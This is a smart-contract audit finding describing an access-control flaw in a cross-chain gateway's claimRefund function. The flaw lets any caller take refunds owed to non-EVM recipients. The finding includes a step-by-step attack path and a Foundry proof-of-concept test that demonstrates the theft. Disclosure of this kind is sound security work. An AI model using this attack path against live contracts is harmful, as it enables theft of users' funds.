# Attacker Will Steal Refund Tokens Intended for Non-EVM Recipients




## Summary
A logic flaw in the access control mechanism of the `claimRefund` function within the `GatewayCrossChain` contract will cause a loss of funds for non-EVM recipients as an attacker will exploit the flaw to redirect refund tokens to themselves. This vulnerability stems from improper validation of the caller’s identity when processing refunds for non-EVM destinations, such as Bitcoin or Solana, allowing unauthorized claims.

## Root Cause
In [`GatewayCrossChain.sol`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L574-L577), the [`claimRefund`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L571-L590) function mishandles receiver assignment and access control for non-EVM refunds. When the `walletAddress` length is not 20 bytes (indicating a non-EVM destination), the function sets the `receiver` to `msg.sender` and evaluates the condition `bots[msg.sender] || msg.sender == receiver`. Since `msg.sender` equals itself, this check always passes, permitting any caller to claim the refund, regardless of authorization.

```solidity
address receiver = msg.sender;
if(refundInfo.walletAddress.length == 20) {
    receiver = address(uint160(bytes20(refundInfo.walletAddress)));
}
require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");

```


## Internal Pre-conditions
1. A cross-chain transaction to a non-EVM destination must fail, causing the `onRevert` or `onAbort` function to store refund details in the `refundInfos` mapping with a `walletAddress` length other than 20 bytes.
2. The `refundInfos` mapping must hold an entry for an `externalId` tied to a refund, specifying the token, amount, and non-EVM `walletAddress`.

## External Pre-conditions
No external changes or conditions in other protocols are required for this vulnerability to be exploited. The issue depends entirely on the contract’s internal logic and state, making it readily accessible to any observant attacker.

## Attack Path
1. An attacker identifies a refund for a non-EVM destination by monitoring `EddyCrossChainRefund` events emitted during failed transactions, noting the associated `externalId`.
2. The attacker calls `claimRefund` with the identified `externalId`, triggering the retrieval of the stored `RefundInfo`.
3. Since `walletAddress.length != 20`, the function assigns `receiver` to the attacker’s address (`msg.sender`).
4. The access check `bots[msg.sender] || msg.sender == receiver` passes trivially as the attacker equals the receiver, allowing the transfer of tokens to the attacker via `TransferHelper.safeTransfer`.
5. The refund entry is erased from `refundInfos`, concealing the theft, and an event logs the attacker’s address as the claimant.

## Impact
This flaw enables attackers to steal tokens intended for non-EVM recipients, resulting in direct financial loss for legitimate claimants and eroding confidence in the cross-chain refund system. The impact is immediate and severe, with no additional assumptions required.

## PoC
add this poc test into : `GatewayCrossChain.t.sol`

```bash
forge test --match-test test_RefundTokenTheftVulnerability -vv
```
```solidity
function test_RefundTokenTheftVulnerability() public {
        // Setup: Create a refund for a non-EVM (Solana) recipient
        bytes32 externalId = keccak256(abi.encodePacked(block.timestamp));
        uint256 amount = 100 ether;
        token1Z.mint(address(gatewayCrossChain), amount);

        // Simulate a failed cross-chain transaction to Solana
        vm.prank(address(gatewayZEVM));
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset: address(token1Z),
                amount: amount,
                outgoing: false,
                chainID: 7000,
                revertMessage: bytes.concat(externalId, solAddress) // solAddress is 44 bytes
            })
        );

        // Initial balances
        uint256 attackerInitialBalance = token1Z.balanceOf(user1); // Using user1 as attacker
        uint256 solanaWalletInitialBalance = token1Z.balanceOf(address(bytes20(solAddress)));

        // Attack: Attacker claims the refund
        vm.prank(user1); // Using user1 as attacker
        gatewayCrossChain.claimRefund(externalId);

        // Verify the attack was successful
        uint256 attackerFinalBalance = token1Z.balanceOf(user1); // Using user1 as attacker
        uint256 solanaWalletFinalBalance = token1Z.balanceOf(address(bytes20(solAddress)));

        // The attacker should have received the tokens
        assertEq(attackerFinalBalance - attackerInitialBalance, amount);
        // The intended Solana recipient should not have received any tokens
        assertEq(solanaWalletFinalBalance - solanaWalletInitialBalance, 0);
    }
```
## Mitigation
To resolve this, restrict non-EVM refund claims to trusted bots, ensuring only authorized entities handle off-chain transfers.
